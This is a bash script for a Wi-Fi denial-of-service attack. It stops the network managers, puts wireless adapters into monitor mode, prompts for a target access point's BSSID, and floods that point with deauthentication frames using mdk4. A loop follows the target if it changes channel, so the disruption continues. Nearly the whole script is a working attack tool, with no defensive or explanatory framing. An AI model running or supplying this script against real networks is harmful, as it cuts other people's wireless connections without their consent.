#!/usr/bin/env bash

pkill airodump
pkill xterm
pkill mdk
pkill NetworkManager
pkill wpa_supplicant
rm ./*.csv bl.txt > /dev/null 2>&1
airmon-ng stop wlan0 > /dev/null 2>&1
airmon-ng stop wlan1 > /dev/null 2>&1
airmon-ng stop wlan2 > /dev/null 2>&1
airmon-ng stop wlan3 > /dev/null 2>&1
echo $$ > zart_pid.txt
mdk="mdk4"

xterm -hold -e "iwconfig" &
read -rp "copy paste adapter for airodump: " airodump_interface
read -rp "copy paste adapter for mdk: " mdk_interface
#pkill xterm
airmon-ng start "$airodump_interface" > /dev/null 2>&1
xterm -hold -e "airodump-ng -w scan --output-format csv -M $airodump_interface" &
read -rp "copy paste bssid you want to deauth: " bssid_target
echo "$bssid_target" > bl.txt
mdk_channel=$(grep "$bssid_target" -m1 scan-01.csv | cut -d "," -f 4 | tr -d ' ')
#echo "if you want to target more bssid copy paste them here"
#xterm -e "nano bl.txt"
#read -rp "choose channel for mdk deauth: " mdk_channel
#echo "$mdk_channel" > mdk_chan.txt
#echo "if you want you can enter more channels here seperated with comma"
#pkill xterm
airmon-ng start "$mdk_interface" > /dev/null 2>&1
#xterm -e "nano mdk_chan.txt"
xterm -e "$mdk $mdk_interface d -b bl.txt -c $mdk_channel" &
echo "close this window to stop the attack"
#xterm -e "mdk4 $mdk_interface d -b bl.txt -c $mdk_channel" &

while true; do
	xterm -e "airodump-ng -w a --output-format csv -d $bssid_target $airodump_interface" &
	sleep 5
	pkill airodump
	sleep 0.3
	mdk_new_channel=$(grep "$bssid_target" -m1 a-01.csv | cut -d "," -f 4 | tr -d ' ')
	sleep 0.3
	rm ./*.csv
	sleep 0.3
	if [[ "${mdk_new_channel}" =~ ^([0-9]+)$ ]] && [ $mdk_new_channel -ne $mdk_channel ]
	then
		mdk_channel="$mdk_new_channel"
		pkill mdk
		sleep 0.3
		xterm -e "$mdk $mdk_interface d -b bl.txt -c $mdk_channel" &
	fi
done
#zart_pid=$(<zart_pid.txt) && kill -SIGTERM -- -$zart_pid
